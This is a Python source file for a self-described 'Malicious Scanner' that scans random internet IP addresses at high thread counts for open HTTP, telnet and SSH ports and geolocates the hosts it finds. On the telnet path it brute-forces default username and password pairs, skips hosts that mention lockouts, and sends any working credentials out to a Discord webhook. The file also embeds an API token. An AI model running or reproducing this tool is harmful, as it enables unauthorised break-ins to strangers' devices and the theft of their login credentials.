# RANDOMIZED IP FINDER/SCANNER


# IMPORTS
import random
import socket
import threading
import time
import os
import pyfiglet
import requests
import json
from plyer import notification
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live


# INITIALIZE OBJECT
console = Console()
console_width = console.size.width


class filler_class():
    def __init__(self):
        pass
    
    def track_ips():
        pass


class random_ip_scanner():
    """Generates random IP's // Automatically scans it for whatever port the user chooses // combined with threading to scan thousands of IP's in seconds //
    And automatically looks for open portal connections with port 80 and if so opens it up """
    lock = threading.Lock()
    
    # ANYTHING IN THE PARAMETERS // USER HAS TO DEFINE FOR CLASS TO WORK
    def __init__(self, thread_count, port, scan_amount, type, open_links=False): #-> None():
        
        # INITALIZE OBJECTS
        #self.amount_to_scan = 100000
        self.ports = int(port) #if port else port = 80
        self.total_scanned = 0
        self.open_ips = 0
        self.address = []
        self.thread_count = int(thread_count)# if thread_count else thread_count = 250
        #self.lock = threading.Lock()
        self.amount_to_scan = scan_amount
        self.scan_count = 0

        # RESPONSIBLE FOR HTTP CONNECTIONS
        self.open_links = open_links


        # RESPONSIBLE FOR WHAT TYPE OF SCAN WE ARE DOING
        self.type_of_scan = type
        self.open_connections = 0

        


    def random_ips(self):
        """"GENERATES A RANDOM IP """
        
        # CREATE RANDOM IP
        r = random.randint(1,255)
        a = random.randint(1,255)
        n = random.randint(1,255)
        d = random.randint(1,255)

        rand_total = (f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
    
        
        # COMBINE VARIABLES
        rand = (f"{r}.{a}.{n}.{d}")
        
        
        #print(rand)
        return rand
    

    def port_scanner(self):
        """"Scans the random ip for open port(s)"""

        # STATIC VARIABLE // FOR RACE CONDITIONS
        up = 1
        
        
        
        # IMPORT RANDOM IP // AND PORT
        rand = self.random_ips()
        address = self.address
       
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(.5)
            result = s.connect_ex((rand, self.ports))

            if result == 0:

                # ADD TO VARIABLE // IF IP IS ACTIVE
                self.open_ips += up
                  
                
                # FOR ACTIVE IP LIST
                if self.type_of_scan == 3:
                    file_name = "active_ip_list.txt"
                    active = f"{rand}:{self.ports}\n"
                    with open(file_name, "a") as file:
                        file.write(active)
                    console.print(f"[grey]{self.open_ips}.[/grey] [bold blue]Target:[/bold blue] [bold red]{rand}[/bold red] ---> [bold blue]Port:[/bold blue] [bold green]{self.ports}[/bold green]")

                
                # FOR TELNET & SSH BRUTEFORCING 
                elif self.type_of_scan == 2:
                    self.rand = rand
                    #console.print(f"[grey]{self.open_ips}.[/grey] [bold blue]Target:[/bold blue] [bold red]{rand}[/bold red] ---> [bold blue]Port:[/bold blue] [bold green]{self.ports}[/bold green]")
                    self.ip_info(ip=rand, port=self.ports)
                   # bruteforcer = connection_to_open_port(open_connections=self.open_connections)
                    #bruteforcer.telnet_bruteforcer(ip=rand)
                    

                # FOR HTTP CONNECTIONS
                elif self.type_of_scan == 1:
                    
                   
                    connect = connection_to_open_port(open_connections=self.open_connections) 
                    add = connect.http_attempt(ip=rand, open_links=self.open_links)
                    
                    with self.lock:
                        if add:
                            self.open_connections += 1
                    
                address.append(rand)

            # TOTAL IP'S SCANNED
            self.total_scanned += up  

    
    def threader(self):
        """"Multi - Threading // allowing for faster scanning // meaning faster results"""
        
        # CREATE THREAD LIST
        threads = []
        self.thread_amount = 0
        open = 1
    
        for thread in range(self.thread_count):
            t = threading.Thread(target=self.port_scanner) 
            threads.append(t)

            self.thread_amount += open 
            

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join() 
    

    def ip_info(self, ip, port):
        """Performs a Geo-Lookup of the param 'ip'"""
        
      
        
        
        with self.lock:
            #time.sleep(1)
            self.scan_count += 1
            try:
            # print("made it")
                api_key = "cb5f18ba92fced"
                url = f"https://ipinfo.io/{ip}?token={api_key}"
                response = requests.get(url)
                data = response.json()


                city = data.get('city', "N/A")
                region = data.get("region", "N/A")
                country = data.get('country', "N/A")

                table = Table(title=f"Target Info  #{self.scan_count}", title_style="bold red", style="bold purple", header_style="bold red")
                table.add_column("Variable", style="bold blue")
                table.add_column("Value", style="yellow")
                table.add_row("City",f"{city}", )
                table.add_row("Region",f"{region}" )
                table.add_row("Country",f"{country}" )

                table.add_section()
                table.add_row("[bold blue]IP Address[/bold blue]", f"{ip}", style="bold green")
                #table.add_section()
                table.add_row("[bold blue]Port[/bold blue]", f"{port}", style="bold green")

                
                # USE THE EMPTY PRINTS FOR BETTER OUTPUT SEPERATION

                print("")
                console.print(table)
                print("")
               # time.sleep(3)
                
                #if country == "US":
                  #  if region == "Florida" or "florida":

                

            except Exception as e:
                city = "N/A"
                region = "N/A"
                country = "N/A -e"
                table = Table(title=f"Target Info  #{self.scan_count}", title_style="bold red", style="bold purple", header_style="bold red")
                table.add_column("Variable", style="bold blue")
                table.add_column("Value", style="yellow")
                table.add_row("City",f"{city}", )
                table.add_row("Region",f"{region}" )
                table.add_row("Country",f"{country}" )
         
                console.print(table)
            
            finally:
                if self.type_of_scan == 2:
                    bruteforcer = connection_to_open_port(open_connections=self.open_connections)
                    bruteforcer.telnet_bruteforcer(ip=ip)

                #console.print(f"Geo lookup IP: {ip}")

    
    def loop_controller(self):
        """"Controls the amount of times the threader function is placed in a loop // The amount of IP Addresses that are scanned."""
        
        # AMOUNT TO SCAN
       # self.amount_to_scan = 10000
        s = None
        
        # CREATE PANEL 
        panel = Panel(f"ACTIVE IP'S: {self.open_ips} / {self.total_scanned} / Thread Count: {self.thread_count}", style="red", border_style="bold red", width=console_width)
 

        # LOOP THE MAIN TASK  //  KEEPS TRACK OF TOTAL IPS SCANNED // AND UPDATES RESULT FOR LIVE TABLE
        with Live(panel, console=console, refresh_per_second=10):
            while self.total_scanned < self.amount_to_scan:
            
              self.threader()
    
              panel.renderable = f"ACTIVE IP'S: [bold green]{self.open_ips}[/bold green] out of [bold blue]{self.total_scanned}[/bold blue] - Thread Count: [yellow]{self.thread_amount}[/yellow]"

              #if self.total_scanned > 999:
                 # s = self.total_scanned   
                  #self.total_scanned = 0            
        
        ai = int(self.open_ips)
        ti = int(self.total_scanned)
                  
        ip_track = data()
        ip_track.record_scan_amount(type=2, active_ips=ai, total_ips=ti)
        ex = extra_shii()
        msg = f"Malicious Scan now complete\nActive IP's Found: {self.open_ips} out of {self.total_scanned} IP scans"
        ex.noty(msg)
        
        console.input("\n\n[bold red]Press enter to leave: [/bold red]")


class connection_to_open_port():
    """Automatically checks to see if an IP has a active connection that can then be exploited"""

    lock = threading.Lock()
    num = 1

    
    def __init__(self, open_connections):
        self.open = open_connections
        self.locku = threading.Lock()
        
        pass
    

    # ATTEMPT TO CONNECT TO HTTP PORTAL LOGIN ( ONLY TO CHECK FOR STATUS )
    def http_attempt(self,ip, open_links):
        """Attempts to connect to ip through open portal if successfull, portal will be opened up in chrome"""

        # FOR PULLING GEO INFO
        
       
        # URL TO ATTEMPT CONNECTION
        url = f"http://{ip}/#/portal"
        # open = self.open 
         
        try:
            response = requests.get(url, timeout=2)
            r =  response.status_code
            
            if r == 200:
                console.print(f"[bold blue]Target:[/bold blue] [bold red]{ip}[/bold red] ---> [bold blue]url: {url}[/bold blue] [bold green][/bold green]\n")
                    
                # TO AUTOMATICALLY OPEN CONNECTIONS OR NOT
                if open_links:
                        if os.name == "nt":
                            os.system(f"start chrome {url}")
                            console.input("\n\n[green]Press enter for next scan: [/green]")
                            time.sleep(1)
                            return True
                    
                else:
                    return True
            
            
            return False
                    
        except Exception as e:
        #console.print(e)
            pass
    
    def telnet_bruteforcer(self, ip):
        
        #console.print(f"Brute Forcer IP: {ip}")

        first = True
        timeout = 0.5
        coder = "utf-8"
        attempts = 1

        usernames = ["admin", "root", "user"]
        passwords = ["1234", "admin", "password", "root", "password123"]

        for username in usernames:
            for password in passwords:
                with connection_to_open_port.lock:
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.settimeout(timeout)
                            s.connect((ip, 23))

                            # GET INITIAL SERVER RESPONSE
                            if first:
                                try:
                                    initial_response = s.recv(4096).decode(coder, errors="ignore")
                                    time.sleep(0.5)  # Allow time for the server to get ready
                                    console.print(f"Initial Server Response: {initial_response}")
                                except UnicodeDecodeError:
                                    console.print("[red]Failed to decode initial response[/red]")
                                    initial_response = ""
                                first = False

                            # SEND CREDENTIALS
                            s.sendall(f"{username}\n".encode(coder))
                            time.sleep(.2)
                            s.sendall(f"{password}\n".encode(coder))

                            # RECEIVE RESPONSE
                            try:
                                response = s.recv(4096).decode(coder, errors="ignore").lower()
                                console.print(f"Server Response: {response}")  # Debugging
                            except UnicodeDecodeError:
                                console.print("[red]Could not decode response[/red]")
                                response = ""

                            # CHECK LOGIN SUCCESS
                            if "welcome" in response or "success" in response:
                                msg = f"Login Success: {ip} | Username: {username} | Password: {password}"
                                console.print(f"[green]{msg}[/green]")
 
                                # TRY TO PRINT THE LOGIN MESSAGE
                                try:
                                    login_response = s.recv(4096).decode(coder, errors="ignore")
                                    time.sleep(0.5)  # Allow time for the server to get ready
                                    console.print(f"login response: {login_response}")
                                except UnicodeDecodeError:
                                    console.print("[red]Failed to decode initial response[/red]")
                                    login_response = "No Login Response Found"

                                # SEND NOTIFICATIONS
                                noty = extra_shii()
                                noty.noty(msg)

                                data_sender = extra_shii()
                                data_sender.discord_webhook(ip=ip, username=username, password=password, port=23, login_response=login_response, initial_response=initial_response, post_response=response)

                                return  # Stop brute force on success

                            # SKIP HOST IF ACCOUNT IS LOCKED OR BANNED
                            elif any(keyword in response for keyword in ["disabled", "banned", "rejected", "refused", "denied", "protection", "bruteforce", "unauthorized", "closed"]):
                                console.print(f"[red]Skipped: {ip} - Account locked/banned[/red]")
                                print("")
                                return

                            else:
                                console.print(f"[yellow]Failed Login: {username}:{password}[/yellow]")

                    except (UnicodeDecodeError, UnicodeEncodeError) as e:
                        coder = "ascii"  # Fallback to ASCII
                        console.print(f"[red]Unicode Error: {e}[/red]")
                        continue

                    except TimeoutError as e:
                        
                        console.print(f"[bold red]Timeout error:[/bold red] [yellow]attempt {attempts}/2[/yellow]")
                        timeout += 0.3
                        attempts += 1
                        if attempts == 3:
                            console.print(f"[red]Timeout Error: Too many failed attempts on {ip}[/red]")
                            return

                    except socket.error as e:
                        if e.errno == 10054:
                            console.print(f"[red]Connection Reset: {ip} (Error 10054)[/red]")
                            return
                        else:
                            console.print(f"[red]Socket Error: {e}[/red]")
                            return

                    except Exception as e:
                        console.print(f"[red]Unexpected Error: {e}[/red]")



class connection_status():
    """Responsible for making sure the user is online with a active connection"""

    def __init__(self):
        self.clear_screen = extra_shii.clear_screen(self)
        pass

    def online_check(self):
        """Responsible for checking if the user is online // Pulls local IP & Host name"""

        # PANELS FOR OUTPUT
        #panel_on = Panel(f"CONNECTION STATUS: ONLINE\nLocal IP: {self.local_ip}", style="yellow", border_style="yellow", width=console_width)
       # panel_off = Panel(f"CONNECTION STATUS: OFFLINE\n{e}", style="yellow", border_style="yellow", width=console_width)
       
        while True:
            try:
                
                # PULLS USER HOST NAME // LOCAL IP
                host = socket.gethostname()
                self.local_ip = socket.gethostbyname(host)
                self.local_ip = self.mask(ip=self.local_ip)
                panel_on = Panel(f"CONNECTION STATUS: ONLINE\nLocal IP: {self.local_ip}", style="yellow on black", border_style="bold black", width=console_width)
                console.print(panel_on)

                # PUTS SOME SPACE BETWEEN OUTPUTS
                print("")           
                break    
            
            except KeyboardInterrupt as e:
                self.clear_screen()
                panel_leave = Panel("Sorry to see you go, Hopefully I see you again soon.", style="red", border_style="bold red", width=console_width)
                console.print(panel_leave)
                time.sleep(2)
                exit()
                
            except socket.gaierror as e:
                panel_off = Panel(f"CONNECTION STATUS: OFFLINE\n{e}", style="yellow", border_style="yellow", width=console_width)
                console.print(panel_off)

            except Exception as e:
                panel_off = Panel(f"CONNECTION STATUS: OFFLINE\n{e}", style="yellow", border_style="yellow", width=console_width)
                console.print(panel_off)
    
    def pull_public_ip(self):
        """Responsible for pulling public info (Public IP)"""

        
        # ATTEMPT TO PULL PUBLIC IP
        try:
            local_ip = self.local_ip
            public_ip = "23.227.38.65"
            url = f"https://api64.ipify.org?{public_ip}format=json"
            response = requests.get(url)
            data = response.json()
            #public_ip = data
            console.print(data)
         
        except requests.ConnectionError as e:
            console.print(e)

        except requests.JSONDecodeError as e:
            console.print(e)

        
        except Exception as e:
            console.print(e)

    
    def mask(self, ip):
        """Responsible for masking IP"""
        
        octet = ip.split('.')
        octet[3] = "xxxx"
        octet[2] = "xxxx"
        ip = '.'.join(octet)
        return ip
        

class user_interface():
    """This class is in charge of handling user visuals // and user inputs"""

    def __init__(self):
        pass


    def welcome(self):
        """"function appears at the beginning of each start // loop"""

        # CREATE OBJECT THAT HOLDS SETTINGS // SCAN RESULTS
        settings = data()
        scan_results = settings.record_scan_amount(type=1,active_ips="",total_ips="")
        scans_completed = scan_results.get("scan_amount", 0)
        total_ips_active = scan_results.get("total_active_ips", 0)
        total_ips_scanned = scan_results.get("total_ips_scanned", 0)

        # USER SETTINGS
        user_settings = settings.load_setting()
        user_name = user_settings.get("user_name", "nsm")

        # CREATE WELCOME MESSAGE
        welcome = pyfiglet.figlet_format("Vulnerability Finder")
        welcome_jr = Panel(f"Welcome back {user_name}\n\n{welcome}\n[cyan]Malicious Scanner - 1.2[/cyan]                        [cyan]Scans Completed: {scans_completed}[/cyan]"
                           f"[cyan]                          Active IP's Found: {total_ips_active}[/cyan]"              
                           , style=" bold red on black", border_style="bold red", width=console_width, title="Ethical Practicioner")
        
        info_panel = Panel(f"Completed Scans: {scans_completed}\nTotal Active IP's: {total_ips_active}\nTotal IP's Scanned: {total_ips_scanned}", style="cyan", border_style="bold cyan")
        console.print(welcome_jr)
        #console.print(info_panel)

        # SPACE BETWEEN PANELS
       # print("\n")

    def user_choice(self):
        """"Where users chooses how they want to procceed with the program"""

        # CREATE OBJECT FOR CLEAR SCREEN
        ex = extra_shii()

        # OPTIONS TO CHOOSE FROM
        panel_choices = Panel("\n1. http - Port: 80\n2. Telnet - Port: 23\n3. Ssh - Port: 22\n4. Create Active IP List\n\n5. Exit", title="NSM MENU", border_style="bold black", style="red on black", width=console_width)
        console.print(panel_choices)

        # SOME SPACE BETWEEN PRINTS
        print("\n")

        # START THE USER INPUT
        while True:
            choice = console.input("[red]Type your choice here: [/red]")
             

            # OPTIONS  
            try:
                if choice == "1":                                        # HTTP
                    ex.clear_screen()

                    conn = False
                    
                    while True:
                        cz = console.input("Do you want url's to automatically open in your Chrome Browser(y/n): ").lower()
                        if cz == "y":
                            self.open_links = True
                            conn = True
                            break

                        elif cz == "n":
                            self.open_links = False
                            czz = 0
                            break
                        
                        else:
                            console.print("invalid choice, Try again!")
                    
                        
                    
                    nsm = random_ip_scanner(thread_count=1000,port=80, scan_amount= 100000,type=1, open_links=self.open_links)
                    nsm.loop_controller()
                    break
                
                elif choice == "2":                                      # TELNET
                    ex.clear_screen()
                    nsm = random_ip_scanner(thread_count=5000, port=23, scan_amount= 1000000,type=2)
                    nsm.loop_controller()
                    #scan_amount_records = data()
                   # scan_amount_records.record_scan_amount(type=2, active_ips="", total_ips="")
                    break

                elif choice == "3":                                      # SSH
                    ex.clear_screen()
                    nsm = random_ip_scanner(thread_count=350, port=22, scan_amount= 100000, type=3)
                    nsm.loop_controller()
                    break

                elif choice == "4":
                    ex.clear_screen()
                    nsm = random_ip_scanner(thread_count=50000, port=23, scan_amount= 10000000,type=3)  # 3 IS FOR CREATING A ACTIVE IP LIST THAT WILL BE SAVED TO A TEXT FILE
                    nsm.loop_controller()
                    file_name = "active_ip_list.txt"
                    letter = f"\n\n\nTotal Active IP's Found: {nsm.open_ips}"
                    with open(file_name, "a") as file:
                        file.write(letter)
                    



                elif choice == "5":
                    console.print("[red]Now exiting to main menu[/red]")
                    time.sleep(2)
                    exit()

                else:
                    console.print("[red]Error:[/red] [yellow]Please select a valid choice[/yellow]")
            
            except KeyboardInterrupt as e:
                console.print("\n\nNow exiting to main menu", style="bold green")
                time.sleep(2)
                exit()
            
            except Exception as e:
                console.print(e)
                console.input("[bold red]Press enter to validate error: [/bold red]")


class data():
    """Responsible for storing data and also reading that said data"""

    def __init__(self):
        self.file_path_total_scans = "vuln_finder_total_scans.json"    # FOR TRACKING AMOUNT OF TOTAL IPS SCANNED
        self.file_path_scan_results = "vuln_finder_scan_results.txt"   # FOR SCAN SAVE RESULTS // LIKE GEO INFO, OPEN PORTS AND IP ADDRESS
        self.file_path_user_setting = "vuln_finder_user_setting.json"  # FOR USER SAVED SETTINGS
        self.indent_amount = 4     # ENSURES THAT IT STAYS THE SAME DYNAMICALLY
        

    def record_scan_amount(self, type, active_ips, total_ips):
        """Responsible for keeping track of scan results // not needed """
        
        # FOR READING DATA
        if type == 1:
            while True:
                try:   # READ // PULL THE SCAN RESULTS
                    with open(self.file_path_total_scans, "r") as file:
                        content = json.load(file)
                        return content
                
                except FileNotFoundError as e:

                    data = {
                        "scan_amount": 0,
                        "total_active_ips": 0,
                        "total_ips_scanned": 0
                    } 
                
                    with open(self.file_path_total_scans, "w") as file:
                        json.dump(data, file, indent=4)
                    console.print(e)
        

        # FOR APPENDING DATA
        elif type == 2:
              while True:
                try:   # 
                    with open(self.file_path_total_scans, "r") as file:
                        content = json.load(file)

                        # NOW ADD TO IT 
                        content["total_active_ips"] += active_ips 
                        content["total_ips_scanned"] += total_ips 
                        content["scan_amount"] += 1
            
                        
                        # AND REWRITE SCAN RECORDS SETTING
                        with open(self.file_path_total_scans, "w") as file:
                            json.dump(content, file, indent=4)
                            #console.print(f"Dated successfully dumped: {content}")
                            break
                
                except FileNotFoundError as e:

                    data = {
                        "scan_amount": 0,
                        "total_active_ips": 0,
                        "total_ips_scanned": 0
                    } 
                
                    with open(self.file_path_total_scans, "w") as file:
                        json.dump(data, file, indent=4)
                    console.print(e)


        
    def save_data(self, data):
        """Responsible for saving changed setting"""

        while True:
            try:  

                with open(self.file_path_user_setting, "w") as file:
                    json.dump(data, file, indent=self.indent_amount)
                    break
            
            except FileNotFoundError as e:

                create_settings = self.create_file()
                create_settings
                console.print(e)
                

    
    def load_setting(self):
        """Allows the user to load saved settings"""
        
        while True:
            try:
                file_path = self.file_path_user_setting

                with open(file_path, "r") as file:
                    content = json.load(file)
                    return content
            
            except Exception as e:

                create_settings = self.create_file()
                create_settings
                console.print(e)
            



    def create_file(self):
        """Allows default file path to be created if none is found"""

        try:
            file_path = self.file_path_user_setting

            write = {
                    "user_name": "Vuln Finder",
                    "total_ips_scanned": 0,
                    "scan_show": "yes"
                }

            with open (file_path, "w") as file:
                json.dump(write, file, indent=self.indent_amount)
                console.print("Default File Path Successfully Created", style="bold green")
                time.sleep(2)
        
        except Exception as e:
            
            console.print(e)

                
class extra_shii():
    """Where tools such as clear screen and notifications are at"""

    def __init__(self):
        pass

    def clear_screen(self):
        """"Clears the user console for smoother and cleaner looking transitions between actions"""

        if os.name == "nt":  # WINDOWS
            os.system("cls")
        
        else:
            os.system("clear")  # UNIX

    def noty(self, msg):
        """"Sending notifications to the user screen"""

        notification.notify(
            title = "Malicious Scanner",
            app_name = "Malicious Scanner",
            message = msg,
            timeout = 10
        )
    
    def discord_webhook(self, ip, port, username, password, login_response, initial_response,post_response ):
        """Responsible for sending information to discord, upon successfull ip found"""

        # PLACE YOUR DISCORD WEBHOOK INSIDE THE EMPTY STRING
        webhook_url = ""
        
      #  timestamp = datetime().strftime("%d/%m/%Y, %H:%M:%S")

        data = {
            "content": f"\nActive IP Found: {ip} Port: {port}\n----- Login Credentials -----\nUsername: {username}\nPassword: {password}\n"
            f"\n----- Server Responses -----\nInitial Server Response: {initial_response}\nPost Response: {post_response}\nLogin Response: {login_response}"
            "\n----- Use the server responses to help determine False from True Positives -----\n\n - END",
            "username": "MALICIOUS BOT"
            }

        response = requests.post(webhook_url, data=json.dumps(data), headers={"content-type": "application/json"})

        if response.status_code == 204:
            console.print("Discord Successfully Notified", style="bold green")
        
        else:
            console.print("Failed to Notify Discord", style="bold red")

        
class main():
    """Main class thats in charge of calling upon other sub classes"""
    
    def __init__(self):

        self.sub_class = user_interface()
        self.ex = extra_shii()               # FOR EXTRA SHII INTO OBJECT
        self.internet = connection_status()

    def main(self):
        """"Sole class function responsible for the entire module"""

        # PUTTING INTO A CLEANER LOOKING OBJECT
        sub_class = self.sub_class

        # CALL UPON SAID CLASSES & FUNCTIONS
        while True:
            sub_class.welcome()
            self.internet.online_check()
           # self.internet.pull_public_ip()
            sub_class.user_choice()
            self.ex.clear_screen()


        
if __name__ ==  "__main__":
    nsm = main()
    nsm.main()



# ---------------- VERSION CONTROL ----------------
# CURRENTLY ON VERSION  1.2
# CREATING A WORK SCRIPT ==  V.1.1
# USING MODULAR CLASSESS (learn how to use classes)== V.1.2 
# IMPLEMENT AUTOMATICALLY OPENING ACTIVE IP AND CONNECT == V.1.3
# IMPLEMENT INTERNET CONNECTIVITY CHECK == V.1.4
#
#
#



# WILL BE TARGETING THIS AFTER CREATING FULLLY FUNCTIONAL LOGIC
# GUI == V.2.0


